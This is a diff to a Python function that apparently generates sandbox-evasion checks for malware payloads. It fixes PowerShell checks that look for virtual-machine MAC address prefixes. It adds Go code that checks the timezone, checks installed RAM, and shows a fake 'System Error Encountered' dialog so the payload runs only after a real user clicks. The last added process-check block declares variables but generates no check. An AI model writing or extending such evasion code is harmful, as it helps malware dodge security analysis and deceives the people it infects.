@@ -454,7 +454,7 @@ def senecas_games(evasion_payload):
 
             check_code += '$' + sand_macs + ' = New-Object System.Collections.ArrayList\n'
             check_code += '$' + bad_macs + " = '00:0C:29', '00:1C:14', '00:50:56', '00:05:69', '08:00:27'\n"
-            check_code += '$' + current_mac + ' = Get-WmiObject Win32_NetworkAdapterConfiguration | Select -ExpandProperty MACAddress\n'
+            check_code += '$' + current_macs + ' = Get-WmiObject Win32_NetworkAdapterConfiguration | Select -ExpandProperty MACAddress\n'
             check_code += 'ForEach ($' + mac_addy + ' in $' + current_macs + ') {\n'
             check_code += '\tForEach ($' + badmac_addy + ' in $' + bad_macs + ') {\n'
             check_code += '\t\tif ($' + mac_addy + ' | Select-String $' + badmac_addy + ') {\n'
@@ -462,7 +462,7 @@ def senecas_games(evasion_payload):
             check_code += '\t\t}\n'
             check_code += '\t}\n'
             check_code += '}\n'
-            check_code += 'if $' + sand_macs + '.count -eq 0) {\n'
+            check_code += 'if ($' + sand_macs + '.count -eq 0) {\n'
             num_tabs_required += 1
 
         if evasion_payload.required_options["MINPROCESSES"][0].lower() != "x":
@@ -529,7 +529,7 @@ def senecas_games(evasion_payload):
 
         if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":
 
-            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(evasion_payload.required_options["HOSTNAME"][0].lower())            
+            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(evasion_payload.required_options["HOSTNAME"][0].lower())
 
             # Add a tab for this check
             num_tabs_required += 1
@@ -617,6 +617,67 @@ def senecas_games(evasion_payload):
             check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
             check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + evasion_payload.required_options["SLEEP"][0] + ' {'
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":
+            
+            tzone_abbrev = evasion_helpers.randomString()
+            tzone_offset = evasion_helpers.randomString()
+            
+            check_code += '_, ' + tzone_offset + ' := time.Now().Zone()\n'
+            check_code += 'if ' + tzone_offset + ' != 0 {\n'
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["USERPROMPT"][0].lower() != "false":
+            
+            title_box = evasion_helpers.randomString()
+            message_box = evasion_helpers.randomString()
+            user32_dll = evasion_helpers.randomString()
+            messagebox_w = evasion_helpers.randomString()
+
+            check_code += 'var ' + title_box + ' = "System Error Encountered"\n'
+            check_code += 'var ' + message_box + ' = "System error 0x831d83a4 - Press OK to continue"\n'
+            check_code += 'var ' + user32_dll + ' = syscall.NewLazyDLL("user32.dll")\n'
+            check_code += 'var ' + messagebox_w + ' = ' + user32_dll + '.NewProc("MessageBoxW")\n'
+            check_code += messagebox_w + '.Call(0,\n'
+            check_code += '\tuintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(' + message_box + '))),\n'
+            check_code += '\tuintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(' + title_box + '))),\n'
+            check_code += '0)\n'
+            check_code += 'if true {\n'
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["RAMCHECK"][0].lower() != 'false':
+            
+            memstatusx = evasion_helpers.randomString()
+            kernel32_dll = evasion_helpers.randomString()
+            globalmem_status = evasion_helpers.randomString()
+            mem_info = evasion_helpers.randomString()
+
+            check_code += 'type ' + memstatusx + ' struct {\n'
+            check_code += '\tdwLength\tuint32\n'
+            check_code += '\tdwMemoryLoad\tuint32\n'
+            check_code += '\tullTotalPhys\tuint64\n'
+            check_code += '\tullAvailPhys\tuint64\n'
+            check_code += '\tullTotalPageFile\tuint64\n'
+            check_code += '\tullAvailPageFile\tuint64\n'
+            check_code += '\tullTotalVirtual\tuint64\n'
+            check_code += '\tullAvailVirtual\tuint64\n'
+            check_code += '\tullAvailExtendedVirtual\tuint64\n'
+            check_code += '}\n'
+            check_code += 'var ' + kernel32_dll + ' = syscall.NewLazyDLL("kernel32.dll")\n'
+            check_code += 'var ' + globalmem_status + ' = ' + kernel32_dll + '.NewProc("GlobalMemoryStatusEx")\n'
+            check_code += 'var ' + mem_info + ' ' + memstatusx + '\n'
+            check_code += mem_info + '.dwLength = uint32(unsafe.Sizeof(' + mem_info + '))\n'
+            check_code += globalmem_status + '.Call(uintptr(unsafe.Pointer(&' + mem_info + ')))\n'
+            check_code += 'if (' + mem_info + '.ullTotalPhys/1073741824 >= 3) {\n'
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["PROCCHECK"][0].lower() != 'false':
+            
+            kernel32 = evasion_helpers.randomString()
+            createtoolhelp = evasion_helpers.randomString()
+            proc32first = evasion_helpers.randomString()
+            proc32next = evasion_helpers.randomString()
+            closehandle = evasion_helpers.randomString()
 
         # Return check information
         return check_code, num_tabs_required
